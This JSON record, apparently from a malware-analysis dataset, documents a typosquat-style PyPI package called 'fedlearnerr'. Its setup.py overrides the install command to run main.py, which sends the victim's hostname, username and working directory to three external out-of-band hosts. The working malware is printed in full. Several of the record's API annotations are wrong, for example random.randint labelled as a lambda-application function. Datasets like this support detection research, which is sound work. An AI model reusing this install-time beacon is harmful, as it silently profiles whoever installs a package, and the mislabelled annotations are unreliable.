[
  {
    "pyfile": "main.py",
    "code_snippet": "import platform\nimport getpass\nimport os\nimport urllib\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"fedlearnerr\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass  # Data exfiltration occurs here\n        except Exception:\n            pass\n\nif __name__ == \"__main__\":\n    main()",
    "pattern_analysis": {
      "api_sequence": [
        "platform.node",
        "getpass.getuser",
        "os.getcwd",
        "random.randint",
        "urllib.parse.urlencode",
        "urllib.request.urlopen"
      ],
      "api_sequence_with_args": [
        "platform.node()",
        "getpass.getuser()",
        "os.getcwd()",
        "random.randint(10000, 99999)",
        "urllib.parse.urlencode(params)",
        "urllib.request.urlopen(full_url)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.node",
          "id": "get_machine_node",
          "description": "Retrieves machine node name from uname result",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "random.randint",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "urllib.parse.urlencode",
          "id": "encode_url_query",
          "description": "Encodes mapping object to URL query string",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import platform\nimport getpass\nimport os\nimport urllib\nimport random\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"package\": \"fedlearnerr\",\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass  # Data exfiltration occurs here\n        except Exception:\n            pass"
    }
  },
  {
    "pyfile": "setup.py",
    "code_snippet": "from setuptools.command.install import install\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n",
    "pattern_analysis": {
      "api_sequence": [
        "setuptools.command.install.install.run",
        "main.main"
      ],
      "api_sequence_with_args": [
        "setuptools.command.install.install.run(self)",
        "main.main()"
      ],
      "mapped_sequence": [
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "main.main",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        }
      ],
      "contextual_code": "from setuptools.command.install import install\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()"
    }
  },
  {
    "metadata": {
      "package_name": "fedlearnerr-912.6"
    }
  }
]